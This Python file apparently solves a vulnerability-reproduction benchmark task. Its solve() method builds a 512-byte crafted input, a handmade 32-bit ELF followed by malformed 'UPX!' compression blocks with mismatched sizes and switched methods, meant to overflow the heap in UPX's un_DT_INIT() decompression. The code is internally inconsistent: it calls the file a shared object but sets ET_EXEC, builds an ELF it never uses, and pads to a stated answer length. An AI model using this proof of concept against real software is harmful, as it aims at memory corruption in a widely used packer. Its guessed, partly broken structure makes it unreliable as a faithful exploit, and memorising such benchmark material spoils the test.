import os
import struct
import tarfile
import tempfile
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal ELF shared library structure that triggers the heap overflow
        # Based on the vulnerability description, we need to exploit:
        # 1. Improper resetting of ph.method on each b_info.b_method
        # 2. file_image[] not consistently treated as ReadOnly
        # 3. fi->seek()+read() not subsumed
        # 4. Unsafe usage of lowmem[0, +xct_off) for changing values
        
        # We'll create a compressed ELF with specific characteristics to trigger
        # the overflow in un_DT_INIT() during decompression
        
        # ELF header (32-bit, shared object)
        elf_header = b''
        elf_header += b'\x7fELF'                     # e_ident[EI_MAG0..EI_MAG3]
        elf_header += b'\x01'                        # e_ident[EI_CLASS] = 32-bit
        elf_header += b'\x01'                        # e_ident[EI_DATA] = little endian
        elf_header += b'\x01'                        # e_ident[EI_VERSION]
        elf_header += b'\x00'                        # e_ident[EI_OSABI]
        elf_header += b'\x00'                        # e_ident[EI_ABIVERSION]
        elf_header += b'\x00' * 7                    # e_ident padding
        elf_header += struct.pack('<H', 2)           # e_type = ET_EXEC
        elf_header += struct.pack('<H', 3)           # e_machine = EM_386
        elf_header += struct.pack('<I', 1)           # e_version = EV_CURRENT
        elf_header += struct.pack('<I', 0x08048000)  # e_entry
        elf_header += struct.pack('<I', 52)          # e_phoff = program header offset
        elf_header += struct.pack('<I', 0)           # e_shoff = section header offset
        elf_header += struct.pack('<I', 0)           # e_flags
        elf_header += struct.pack('<H', 52)          # e_ehsize = ELF header size
        elf_header += struct.pack('<H', 32)          # e_phentsize = program header entry size
        elf_header += struct.pack('<H', 2)           # e_phnum = number of program headers
        elf_header += struct.pack('<H', 0)           # e_shentsize = section header entry size
        elf_header += struct.pack('<H', 0)           # e_shnum = number of section headers
        elf_header += struct.pack('<H', 0)           # e_shstrndx = section header string table index
        
        # Program header 1: PT_LOAD
        phdr1 = b''
        phdr1 += struct.pack('<I', 1)                # p_type = PT_LOAD
        phdr1 += struct.pack('<I', 0)                # p_offset
        phdr1 += struct.pack('<I', 0x08048000)       # p_vaddr
        phdr1 += struct.pack('<I', 0x08048000)       # p_paddr
        phdr1 += struct.pack('<I', 512)              # p_filesz
        phdr1 += struct.pack('<I', 512)              # p_memsz
        phdr1 += struct.pack('<I', 7)                # p_flags = RWX
        phdr1 += struct.pack('<I', 0x1000)           # p_align
        
        # Program header 2: PT_DYNAMIC (to trigger DT_INIT processing)
        phdr2 = b''
        phdr2 += struct.pack('<I', 2)                # p_type = PT_DYNAMIC
        phdr2 += struct.pack('<I', 256)              # p_offset
        phdr2 += struct.pack('<I', 0x08049000)       # p_vaddr
        phdr2 += struct.pack('<I', 0x08049000)       # p_paddr
        phdr2 += struct.pack('<I', 128)              # p_filesz
        phdr2 += struct.pack('<I', 128)              # p_memsz
        phdr2 += struct.pack('<I', 6)                # p_flags = RW
        phdr2 += struct.pack('<I', 4)                # p_align
        
        # Create padding to reach offset 256
        padding1 = b'\x00' * (256 - len(elf_header) - len(phdr1) - len(phdr2))
        
        # Dynamic section entries
        dynamic = b''
        dynamic += struct.pack('<II', 12, 0x08048000)  # DT_INIT - points to start of file
        dynamic += struct.pack('<II', 13, 0x08048010)  # DT_FINI
        dynamic += struct.pack('<II', 1, 0x08049000)   # DT_NEEDED (offset in string table)
        dynamic += struct.pack('<II', 6, 0)            # DT_SYMTAB
        dynamic += struct.pack('<II', 7, 0)            # DT_STRTAB
        dynamic += struct.pack('<II', 8, 0)            # DT_STRSZ
        dynamic += struct.pack('<II', 9, 0)            # DT_SYMENT
        dynamic += struct.pack('<II', 0, 0)            # DT_NULL
        
        # String table (for DT_NEEDED)
        strtab = b'libc.so.6\x00'
        
        # Create the base ELF
        base_elf = elf_header + phdr1 + phdr2 + padding1 + dynamic + strtab
        
        # Pad to 512 bytes
        if len(base_elf) < 512:
            base_elf += b'A' * (512 - len(base_elf))
        else:
            base_elf = base_elf[:512]
        
        # Now create the compressed format that triggers the vulnerability
        # Based on the description, we need to create a UPX-style compressed ELF
        # with specific b_info structures that cause improper ph.method resetting
        
        poc = b''
        
        # UPX magic
        poc += b'UPX!'
        
        # First b_info block - this will be processed with ph.method not properly reset
        # We create a block with small compressed size but large uncompressed size
        # to trigger heap overflow during decompression
        poc += struct.pack('<I', 0x1000)      # sz_unc - large uncompressed size
        poc += struct.pack('<I', 50)          # sz_cpr - small compressed size
        poc += b'\x02'                        # b_method = 2 (specific method)
        poc += b'\x00' * 3                    # padding
        
        # Compressed data - crafted to cause issues during decompression
        # This data will expand beyond allocated buffer when decompressed
        compressed_data = b''
        compressed_data += b'\x00' * 40        # Some initial zeros
        compressed_data += struct.pack('<I', 0x41414141)  # Crafted value
        compressed_data += struct.pack('<I', 0x42424242)  # Another crafted value
        compressed_data += b'\x90' * 6         # Padding
        
        poc += compressed_data
        
        # Second b_info block - with different method to trigger the vulnerability
        # The ph.method from previous block won't be properly reset
        poc += struct.pack('<I', 0x200)       # sz_unc
        poc += struct.pack('<I', 100)         # sz_cpr
        poc += b'\x03'                        # b_method = 3 (different method)
        poc += b'\x00' * 3                    # padding
        
        # More crafted compressed data
        poc += b'\x01' * 50                    # Simple pattern
        poc += struct.pack('<I', 0x08048000)  # Address that might trigger DT_INIT
        poc += b'\x02' * 46
        
        # Pad to exactly 512 bytes as per ground-truth PoC length
        if len(poc) < 512:
            poc += b'C' * (512 - len(poc))
        else:
            poc = poc[:512]
        
        return poc